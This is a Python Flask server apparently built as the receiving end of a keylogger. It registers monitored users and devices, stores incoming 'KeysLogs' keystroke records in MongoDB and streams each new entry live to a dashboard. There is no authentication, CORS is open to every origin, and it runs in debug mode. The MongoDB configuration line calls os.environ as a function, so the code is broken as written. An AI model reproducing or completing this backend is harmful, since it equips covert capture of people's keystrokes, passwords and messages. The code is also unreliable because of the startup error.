from flask import Flask, request, render_template, jsonify
from flask_socketio import SocketIO
from flask_pymongo import PyMongo
from datetime import datetime
from dotenv import load_dotenv
import os
load_dotenv()
app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")
app.config["MONGO_URI"] = os.environ('MongoServer')
mongo = PyMongo(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log/user/<id>', methods=['GET','POST'])
def logs(id):
    try:
        if request.method=='POST':
            data = request.get_json()
            log_entry = {
                "time": datetime.fromisoformat(data["Time"]),
                "log": data["Logs"],
                "keylog": data["KeysLogs"]
            }
            user = mongo.db.users.find_one({"_id": id})

            if user:
                mongo.db.users.update_one(
                    {"_id": id},
                    {"$push": {"logs": log_entry}}
                )
            socketio.emit('new_log', {'user_id': id, 'log': log_entry}, broadcast=True)
            return jsonify({"status": "success"}), 200
        
        if request.method=='GET':
            user = mongo.db.users.find_one({"_id": id})
            if user:
                user["_id"] = str(user["_id"]) 
                return render_template('userlog.html', user=user)
            else:
                return f"User {id} not found", 404
    

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/log/users',methods=['GET','POST'])
def users():
    try:
        if request.method== 'GET':
            users = mongo.db.users.find()
            user_list = [{"id": str(user["_id"]), "name": user["name"],"device":user['device'],"first_log_date":user["first_log_date"]} for user in users]
            return render_template('user.html', users=user_list)
        
        if request.method=='POST':
            user=request.get_json()
    
            if mongo.db.users.find_one({"_id": user["ID"]}):
                return f"User found", 200
            else:
                new_user = {
                "_id": user["ID"],
                "name": user["Name"],
                "email": user["Email"],
                "device": user["Device"],
                "first_log_date": datetime.now(),
                "logs": []
                }
                mongo.db.users.insert_one(new_user)
            return "User Created",201
            
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500



if __name__ == '__main__':
    socketio.run(app, port=8000, debug=True)
